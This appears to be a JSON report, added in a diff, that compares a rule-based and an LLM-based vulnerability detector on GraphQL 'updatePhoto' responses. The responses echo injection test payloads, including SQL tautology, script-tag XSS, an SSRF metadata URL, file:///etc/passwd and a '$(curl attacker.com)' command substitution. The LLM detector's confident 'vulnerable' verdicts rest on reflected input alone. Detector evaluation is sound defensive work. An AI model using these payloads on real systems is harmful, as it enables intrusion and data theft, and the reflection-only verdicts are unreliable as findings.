@@ -1,0 +1,746 @@
+{
+  "report_timestamp": "2025-09-27T14:33:27.502574",
+  "api_url": "https://graphqlzero.almansi.me/api",
+  "summary": {
+    "total_comparisons": 10,
+    "agreement_rate": 0.4,
+    "simple_detections": 5,
+    "llm_detections": 5,
+    "consensus_breakdown": {
+      "no_vulnerabilities": 4,
+      "both_detected": 4,
+      "llm_only": 1,
+      "simple_only": 1
+    },
+    "detection_ratio": 1.0,
+    "potential_analysis": {
+      "potential_agreement_rate": 0.0,
+      "simple_potential_detections": 4,
+      "llm_potential_detections": 0,
+      "potential_consensus_breakdown": {
+        "no_potential": 6,
+        "simple_potential_only": 4
+      },
+      "potential_detection_ratio": 0.0
+    }
+  },
+  "detailed_comparisons": [
+    {
+      "timestamp": "2025-09-27T14:19:12.616020",
+      "node_name": "updatePhoto_response_2",
+      "response_status": 200,
+      "response_body": {
+        "data": {
+          "updatePhoto": {
+            "id": "911",
+            "title": "malicious' OR '1'='1",
+            "url": "https://via.placeholder.com/600/ca6196",
+            "thumbnailUrl": "https://via.placeholder.com/150/ca6196"
+          }
+        }
+      },
+      "simple_detector": {
+        "results": [],
+        "count": 0,
+        "vulnerable_count": 0,
+        "potential_count": 0,
+        "safe_count": 0,
+        "categories": [],
+        "potential_categories": []
+      },
+      "llm_detector": {
+        "results": [],
+        "count": 0,
+        "vulnerable_count": 0,
+        "potential_count": 0,
+        "safe_count": 0,
+        "categories": [],
+        "potential_categories": []
+      },
+      "comparison": {
+        "total_categories": [],
+        "common_categories": [],
+        "simple_unique_categories": [],
+        "llm_unique_categories": [],
+        "agreement_score": 0.0,
+        "consensus": "no_vulnerabilities",
+        "potential_analysis": {
+          "total_potential_categories": [],
+          "common_potential_categories": [],
+          "simple_unique_potential_categories": [],
+          "llm_unique_potential_categories": [],
+          "potential_agreement_score": 0.0,
+          "potential_consensus": "no_potential"
+        }
+      }
+    },
+    {
+      "timestamp": "2025-09-27T14:20:09.406167",
+      "node_name": "updatePhoto_response_3",
+      "response_status": 200,
+      "response_body": {
+        "data": {
+          "updatePhoto": {
+            "id": null,
+            "title": "<script>alert('xss')</script>",
+            "url": null,
+            "thumbnailUrl": null
+          }
+        }
+      },
+      "simple_detector": {
+        "results": [
+          {
+            "detection_name": "Cross-Site Scripting (XSS) Injection",
+            "detection": "potential",
+            "category": "Injection Attacks",
+            "description": "XSS injection vulnerability detected - malicious script patterns found in response",
+            "evidence": "Response status: 200, XSS patterns detected in response data"
+          }
+        ],
+        "count": 1,
+        "vulnerable_count": 0,
+        "potential_count": 1,
+        "safe_count": 0,
+        "categories": [
+          "Injection Attacks"
+        ],
+        "potential_categories": [
+          "Injection Attacks"
+        ]
+      },
+      "llm_detector": {
+        "results": [
+          {
+            "detection_name": "LLM: xss_injection",
+            "detection": "vulnerable",
+            "category": "Injection Attacks",
+            "description": "The response body contains a reflected XSS payload in the 'title' field. The unescaped <script> tag demonstrates that user-supplied input is directly embedded in the response without proper sanitization. When rendered in a browser, this payload would execute JavaScript, indicating a stored or reflected XSS vulnerability. The mutation operation (updatePhoto) suggests this payload could be stored and served to other users.",
+            "evidence": "title field contains: <script>alert('xss')</script>",
+            "confidence": 0.95,
+            "llm_analysis": {
+              "is_vulnerable": true,
+              "vulnerability_type": "xss_injection",
+              "severity": "HIGH",
+              "confidence": 0.95,
+              "evidence": "title field contains: <script>alert('xss')</script>",
+              "explanation": "The response body contains a reflected XSS payload in the 'title' field. The unescaped <script> tag demonstrates that user-supplied input is directly embedded in the response without proper sanitization. When rendered in a browser, this payload would execute JavaScript, indicating a stored or reflected XSS vulnerability. The mutation operation (updatePhoto) suggests this payload could be stored and served to other users."
+            }
+          }
+        ],
+        "count": 1,
+        "vulnerable_count": 1,
+        "potential_count": 0,
+        "safe_count": 0,
+        "categories": [
+          "Injection Attacks"
+        ],
+        "potential_categories": []
+      },
+      "comparison": {
+        "total_categories": [
+          "Injection Attacks"
+        ],
+        "common_categories": [
+          "Injection Attacks"
+        ],
+        "simple_unique_categories": [],
+        "llm_unique_categories": [],
+        "agreement_score": 1.0,
+        "consensus": "both_detected",
+        "potential_analysis": {
+          "total_potential_categories": [
+            "Injection Attacks"
+          ],
+          "common_potential_categories": [],
+          "simple_unique_potential_categories": [
+            "Injection Attacks"
+          ],
+          "llm_unique_potential_categories": [],
+          "potential_agreement_score": 0.0,
+          "potential_consensus": "simple_potential_only"
+        }
+      }
+    },
+    {
+      "timestamp": "2025-09-27T14:26:21.419815",
+      "node_name": "updatePhoto_response_4",
+      "response_status": 200,
+      "response_body": {
+        "data": {
+          "updatePhoto": {
+            "id": null,
+            "title": null,
+            "url": null,
+            "thumbnailUrl": "http://169.254.169.254/latest/meta-data/"
+          }
+        }
+      },
+      "simple_detector": {
+        "results": [
+          {
+            "detection_name": "Server-Side Request Forgery (SSRF) Injection",
+            "detection": "potential",
+            "category": "Injection Attacks",
+            "description": "SSRF injection vulnerability detected - internal network access patterns found",
+            "evidence": "Response status: 200, SSRF keywords detected in response"
+          }
+        ],
+        "count": 1,
+        "vulnerable_count": 0,
+        "potential_count": 1,
+        "safe_count": 0,
+        "categories": [
+          "Injection Attacks"
+        ],
+        "potential_categories": [
+          "Injection Attacks"
+        ]
+      },
+      "llm_detector": {
+        "results": [
+          {
+            "detection_name": "LLM: ssrf_injection",
+            "detection": "vulnerable",
+            "category": "Injection Attacks",
+            "description": "The response contains a URL pointing to 169.254.169.254, which is a well-known internal cloud metadata endpoint (AWS, Azure, GCP, etc.). This indicates the application processed a user-supplied internal URL. Accessing metadata services can expose sensitive cloud credentials, configuration data, and internal network details, confirming SSRF vulnerability. The null values in other fields suggest a partial mutation success, but the critical risk lies in the server's ability to interact with internal resources.",
+            "evidence": "thumbnailUrl: http://169.254.169.254/latest/meta-data/",
+            "confidence": 0.95,
+            "llm_analysis": {
+              "is_vulnerable": true,
+              "vulnerability_type": "ssrf_injection",
+              "severity": "CRITICAL",
+              "confidence": 0.95,
+              "evidence": "thumbnailUrl: http://169.254.169.254/latest/meta-data/",
+              "explanation": "The response contains a URL pointing to 169.254.169.254, which is a well-known internal cloud metadata endpoint (AWS, Azure, GCP, etc.). This indicates the application processed a user-supplied internal URL. Accessing metadata services can expose sensitive cloud credentials, configuration data, and internal network details, confirming SSRF vulnerability. The null values in other fields suggest a partial mutation success, but the critical risk lies in the server's ability to interact with internal resources."
+            }
+          }
+        ],
+        "count": 1,
+        "vulnerable_count": 1,
+        "potential_count": 0,
+        "safe_count": 0,
+        "categories": [
+          "Injection Attacks"
+        ],
+        "potential_categories": []
+      },
+      "comparison": {
+        "total_categories": [
+          "Injection Attacks"
+        ],
+        "common_categories": [
+          "Injection Attacks"
+        ],
+        "simple_unique_categories": [],
+        "llm_unique_categories": [],
+        "agreement_score": 1.0,
+        "consensus": "both_detected",
+        "potential_analysis": {
+          "total_potential_categories": [
+            "Injection Attacks"
+          ],
+          "common_potential_categories": [],
+          "simple_unique_potential_categories": [
+            "Injection Attacks"
+          ],
+          "llm_unique_potential_categories": [],
+          "potential_agreement_score": 0.0,
+          "potential_consensus": "simple_potential_only"
+        }
+      }
+    },
+    {
+      "timestamp": "2025-09-27T14:26:59.790124",
+      "node_name": "updatePhoto_response_5",
+      "response_status": 200,
+      "response_body": {
+        "data": {
+          "updatePhoto": {
+            "id": "2222",
+            "title": "valid title$(curl attacker.com)",
+            "url": "https://via.placeholder.com/600/5fd1d3",
+            "thumbnailUrl": "https://via.placeholder.com/150/5fd1d3"
+          }
+        }
+      },
+      "simple_detector": {
+        "results": [],
+        "count": 0,
+        "vulnerable_count": 0,
+        "potential_count": 0,
+        "safe_count": 0,
+        "categories": [],
+        "potential_categories": []
+      },
+      "llm_detector": {
+        "results": [
+          {
+            "detection_name": "LLM: os_command_injection",
+            "detection": "vulnerable",
+            "category": "Injection Attacks",
+            "description": "The returned title field contains the '$(curl attacker.com)' substring. This is a command substitution pattern used in Unix shell environments. The parentheses syntax actively attempts to execute a curl command to attacker.com when interpreted by a shell. While the response doesn't show execution symptoms, the injection payload appears unchanged in the output, indicating insufficient input sanitization. Given this mutation operation manipulates image data (updatePhoto) where server-side command execution (e.g., image processing) is plausible, this represents a critical OS command injection risk.",
+            "evidence": "Payload in title field: 'valid title$(curl attacker.com)'",
+            "confidence": 0.85,
+            "llm_analysis": {
+              "is_vulnerable": true,
+              "vulnerability_type": "os_command_injection",
+              "severity": "CRITICAL",
+              "confidence": 0.85,
+              "evidence": "Payload in title field: 'valid title$(curl attacker.com)'",
+              "explanation": "The returned title field contains the '$(curl attacker.com)' substring. This is a command substitution pattern used in Unix shell environments. The parentheses syntax actively attempts to execute a curl command to attacker.com when interpreted by a shell. While the response doesn't show execution symptoms, the injection payload appears unchanged in the output, indicating insufficient input sanitization. Given this mutation operation manipulates image data (updatePhoto) where server-side command execution (e.g., image processing) is plausible, this represents a critical OS command injection risk."
+            }
+          }
+        ],
+        "count": 1,
+        "vulnerable_count": 1,
+        "potential_count": 0,
+        "safe_count": 0,
+        "categories": [
+          "Injection Attacks"
+        ],
+        "potential_categories": []
+      },
+      "comparison": {
+        "total_categories": [
+          "Injection Attacks"
+        ],
+        "common_categories": [],
+        "simple_unique_categories": [],
+        "llm_unique_categories": [
+          "Injection Attacks"
+        ],
+        "agreement_score": 0.0,
+        "consensus": "llm_only",
+        "potential_analysis": {
+          "total_potential_categories": [],
+          "common_potential_categories": [],
+          "simple_unique_potential_categories": [],
+          "llm_unique_potential_categories": [],
+          "potential_agreement_score": 0.0,
+          "potential_consensus": "no_potential"
+        }
+      }
+    },
+    {
+      "timestamp": "2025-09-27T14:28:18.567066",
+      "node_name": "updatePhoto_response_6",
+      "response_status": 200,
+      "response_body": {
+        "data": {
+          "updatePhoto": {
+            "id": null,
+            "title": null,
+            "url": "file:///etc/passwd",
+            "thumbnailUrl": null
+          }
+        }
+      },
+      "simple_detector": {
+        "results": [
+          {
+            "detection_name": "Path Injection",
+            "detection": "potential",
+            "category": "Injection Attacks",
+            "description": "Path injection vulnerability detected - file system access patterns found",
+            "evidence": "Response status: 200, Path injection patterns detected in response"
+          }
+        ],
+        "count": 1,
+        "vulnerable_count": 0,
+        "potential_count": 1,
+        "safe_count": 0,
+        "categories": [
+          "Injection Attacks"
+        ],
+        "potential_categories": [
+          "Injection Attacks"
+        ]
+      },
+      "llm_detector": {
+        "results": [
+          {
+            "detection_name": "LLM: Path Injection",
+            "detection": "vulnerable",
+            "category": "Injection Attacks",
+            "description": "The GraphQL response shows a successful mutation (updatePhoto) that accepted and returned a URL value containing a 'file://' URI scheme pointing to '/etc/passwd'. This file is a sensitive system file on Unix-based OSes. The server's acceptance and reflection of this path without sanitization indicate improper input validation. This could allow an attacker to read, write, or execute arbitrary server files if the application processes such paths, leading to system compromise. The 200 HTTP status confirms the request was processed as valid business logic.",
+            "evidence": "\"url\": \"file:///etc/passwd\"",
+            "confidence": 0.9,
+            "llm_analysis": {
+              "is_vulnerable": true,
+              "vulnerability_type": "Path Injection",
+              "severity": "CRITICAL",
+              "confidence": 0.9,
+              "evidence": "\"url\": \"file:///etc/passwd\"",
+              "explanation": "The GraphQL response shows a successful mutation (updatePhoto) that accepted and returned a URL value containing a 'file://' URI scheme pointing to '/etc/passwd'. This file is a sensitive system file on Unix-based OSes. The server's acceptance and reflection of this path without sanitization indicate improper input validation. This could allow an attacker to read, write, or execute arbitrary server files if the application processes such paths, leading to system compromise. The 200 HTTP status confirms the request was processed as valid business logic."
+            }
+          }
+        ],
+        "count": 1,
+        "vulnerable_count": 1,
+        "potential_count": 0,
+        "safe_count": 0,
+        "categories": [
+          "Injection Attacks"
+        ],
+        "potential_categories": []
+      },
+      "comparison": {
+        "total_categories": [
+          "Injection Attacks"
+        ],
+        "common_categories": [
+          "Injection Attacks"
+        ],
+        "simple_unique_categories": [],
+        "llm_unique_categories": [],
+        "agreement_score": 1.0,
+        "consensus": "both_detected",
+        "potential_analysis": {
+          "total_potential_categories": [
+            "Injection Attacks"
+          ],
+          "common_potential_categories": [],
+          "simple_unique_potential_categories": [
+            "Injection Attacks"
+          ],
+          "llm_unique_potential_categories": [],
+          "potential_agreement_score": 0.0,
+          "potential_consensus": "simple_potential_only"
+        }
+      }
+    },
+    {
+      "timestamp": "2025-09-27T14:28:40.016769",
+      "node_name": "updatePhoto_response_7",
+      "response_status": 200,
+      "response_body": {
+        "data": {
+          "updatePhoto": {
+            "id": "999",
+            "title": "<h1>HTML Injection Test</h1>",
+            "url": "https://via.placeholder.com/600/ffa73e",
+            "thumbnailUrl": "https://via.placeholder.com/150/ffa73e"
+          }
+        }
+      },
+      "simple_detector": {
+        "results": [
+          {
+            "detection_name": "HTML Injection",
+            "detection": "potential",
+            "category": "Injection Attacks",
+            "description": "HTML injection vulnerability detected - HTML markup found in response",
+            "evidence": "Response status: 200, HTML patterns detected in response data"
+          }
+        ],
+        "count": 1,
+        "vulnerable_count": 0,
+        "potential_count": 1,
+        "safe_count": 0,
+        "categories": [
+          "Injection Attacks"
+        ],
+        "potential_categories": [
+          "Injection Attacks"
+        ]
+      },
+      "llm_detector": {
+        "results": [
+          {
+            "detection_name": "LLM: html_injection",
+            "detection": "vulnerable",
+            "category": "Injection Attacks",
+            "description": "The response contains unsanitized user-supplied HTML tags (<h1>) in the 'title' field. This indicates the server isn't properly sanitizing input before storage/return. When rendered client-side without escaping, this could allow HTML injection attacks leading to XSS, defacement, or malicious content execution.",
+            "evidence": "title: '<h1>HTML Injection Test</h1>'",
+            "confidence": 0.8,
+            "llm_analysis": {
+              "is_vulnerable": true,
+              "vulnerability_type": "html_injection",
+              "severity": "HIGH",
+              "confidence": 0.8,
+              "evidence": "title: '<h1>HTML Injection Test</h1>'",
+              "explanation": "The response contains unsanitized user-supplied HTML tags (<h1>) in the 'title' field. This indicates the server isn't properly sanitizing input before storage/return. When rendered client-side without escaping, this could allow HTML injection attacks leading to XSS, defacement, or malicious content execution."
+            }
+          }
+        ],
+        "count": 1,
+        "vulnerable_count": 1,
+        "potential_count": 0,
+        "safe_count": 0,
+        "categories": [
+          "Injection Attacks"
+        ],
+        "potential_categories": []
+      },
+      "comparison": {
+        "total_categories": [
+          "Injection Attacks"
+        ],
+        "common_categories": [
+          "Injection Attacks"
+        ],
+        "simple_unique_categories": [],
+        "llm_unique_categories": [],
+        "agreement_score": 1.0,
+        "consensus": "both_detected",
+        "potential_analysis": {
+          "total_potential_categories": [
+            "Injection Attacks"
+          ],
+          "common_potential_categories": [],
+          "simple_unique_potential_categories": [
+            "Injection Attacks"
+          ],
+          "llm_unique_potential_categories": [],
+          "potential_agreement_score": 0.0,
+          "potential_consensus": "simple_potential_only"
+        }
+      }
+    },
+    {
+      "timestamp": "2025-09-27T14:30:28.629767",
+      "node_name": "updatePhoto_response_8",
+      "response_status": null,
+      "response_body": null,
+      "simple_detector": {
+        "results": [],
+        "count": 0,
+        "vulnerable_count": 0,
+        "potential_count": 0,
+        "safe_count": 0,
+        "categories": [],
+        "potential_categories": []
+      },
+      "llm_detector": {
+        "results": [],
+        "count": 0,
+        "vulnerable_count": 0,
+        "potential_count": 0,
+        "safe_count": 0,
+        "categories": [],
+        "potential_categories": []
+      },
+      "comparison": {
+        "total_categories": [],
+        "common_categories": [],
+        "simple_unique_categories": [],
+        "llm_unique_categories": [],
+        "agreement_score": 0.0,
+        "consensus": "no_vulnerabilities",
+        "potential_analysis": {
+          "total_potential_categories": [],
+          "common_potential_categories": [],
+          "simple_unique_potential_categories": [],
+          "llm_unique_potential_categories": [],
+          "potential_agreement_score": 0.0,
+          "potential_consensus": "no_potential"
+        }
+      }
+    },
+    {
+      "timestamp": "2025-09-27T14:31:22.911682",
+      "node_name": "updatePhoto_response_9",
+      "response_status": null,
+      "response_body": null,
+      "simple_detector": {
+        "results": [],
+        "count": 0,
+        "vulnerable_count": 0,
+        "potential_count": 0,
+        "safe_count": 0,
+        "categories": [],
+        "potential_categories": []
+      },
+      "llm_detector": {
+        "results": [],
+        "count": 0,
+        "vulnerable_count": 0,
+        "potential_count": 0,
+        "safe_count": 0,
+        "categories": [],
+        "potential_categories": []
+      },
+      "comparison": {
+        "total_categories": [],
+        "common_categories": [],
+        "simple_unique_categories": [],
+        "llm_unique_categories": [],
+        "agreement_score": 0.0,
+        "consensus": "no_vulnerabilities",
+        "potential_analysis": {
+          "total_potential_categories": [],
+          "common_potential_categories": [],
+          "simple_unique_potential_categories": [],
+          "llm_unique_potential_categories": [],
+          "potential_agreement_score": 0.0,
+          "potential_consensus": "no_potential"
+        }
+      }
+    },
+    {
+      "timestamp": "2025-09-27T14:32:31.225141",
+      "node_name": "updatePhoto_response_10",
+      "response_status": 400,
+      "response_body": {
+        "errors": [
+          {
+            "message": "Cannot query field \"updatePhoto\" on type \"Query\".",
+            "locations": [
+              {
+                "line": 3,
+                "column": 3
+              }
+            ],
+            "extensions": {
+              "code": "GRAPHQL_VALIDATION_FAILED"
+            }
+          }
+        ]
+      },
+      "simple_detector": {
+        "results": [],
+        "count": 0,
+        "vulnerable_count": 0,
+        "potential_count": 0,
+        "safe_count": 0,
+        "categories": [],
+        "potential_categories": []
+      },
+      "llm_detector": {
+        "results": [],
+        "count": 0,
+        "vulnerable_count": 0,
+        "potential_count": 0,
+        "safe_count": 0,
+        "categories": [],
+        "potential_categories": []
+      },
+      "comparison": {
+        "total_categories": [],
+        "common_categories": [],
+        "simple_unique_categories": [],
+        "llm_unique_categories": [],
+        "agreement_score": 0.0,
+        "consensus": "no_vulnerabilities",
+        "potential_analysis": {
+          "total_potential_categories": [],
+          "common_potential_categories": [],
+          "simple_unique_potential_categories": [],
+          "llm_unique_potential_categories": [],
+          "potential_agreement_score": 0.0,
+          "potential_consensus": "no_potential"
+        }
+      }
+    },
+    {
+      "timestamp": "2025-09-27T14:33:27.500800",
+      "node_name": "updatePhoto_response_11",
+      "response_status": 400,
+      "response_body": {
+        "errors": [
+          {
+            "message": "Cannot query field \"tilte\" on type \"Photo\". Did you mean \"title\"?",
+            "locations": [
+              {
+                "line": 5,
+                "column": 5
+              }
+            ],
+            "extensions": {
+              "code": "GRAPHQL_VALIDATION_FAILED"
+            }
+          },
+          {
+            "message": "Cannot query field \"thumbnailurl\" on type \"Photo\". Did you mean \"thumbnailUrl\"?",
+            "locations": [
+              {
+                "line": 7,
+                "column": 5
+              }
+            ],
+            "extensions": {
+              "code": "GRAPHQL_VALIDATION_FAILED"
+            }
+          }
+        ]
+      },
+      "simple_detector": {
+        "results": [
+          {
+            "detection_name": "Field Suggestions Enabled",
+            "detection": "vulnerable",
+            "category": "Information Disclosure",
+            "description": "Field suggestions enabled - potential information disclosure",
+            "evidence": "Found \"did you mean\" in error message - field suggestions are enabled"
+          }
+        ],
+        "count": 1,
+        "vulnerable_count": 1,
+        "potential_count": 0,
+        "safe_count": 0,
+        "categories": [
+          "Information Disclosure"
+        ],
+        "potential_categories": []
+      },
+      "llm_detector": {
+        "results": [],
+        "count": 0,
+        "vulnerable_count": 0,
+        "potential_count": 0,
+        "safe_count": 0,
+        "categories": [],
+        "potential_categories": []
+      },
+      "comparison": {
+        "total_categories": [
+          "Information Disclosure"
+        ],
+        "common_categories": [],
+        "simple_unique_categories": [
+          "Information Disclosure"
+        ],
+        "llm_unique_categories": [],
+        "agreement_score": 0.0,
+        "consensus": "simple_only",
+        "potential_analysis": {
+          "total_potential_categories": [],
+          "common_potential_categories": [],
+          "simple_unique_potential_categories": [],
+          "llm_unique_potential_categories": [],
+          "potential_agreement_score": 0.0,
+          "potential_consensus": "no_potential"
+        }
+      }
+    }
+  ],
+  "detector_analysis": {
+    "simple_detector": {
+      "description": "Rule-based detector using predefined patterns",
+      "strengths": [
+        "Fast execution",
+        "Consistent results",
+        "Low resource usage"
+      ],
+      "weaknesses": [
+        "Limited to known patterns",
+        "May miss novel attacks",
+        "False negatives possible"
+      ]
+    },
+    "llm_detector": {
+      "description": "AI-powered detector using language model analysis",
+      "strengths": [
+        "Contextual understanding",
+        "Novel attack detection",
+        "Detailed analysis"
+      ],
+      "weaknesses": [
+        "Slower execution",
+        "Resource intensive",
+        "Potential false positives"
+      ]
+    }
+  }
+}
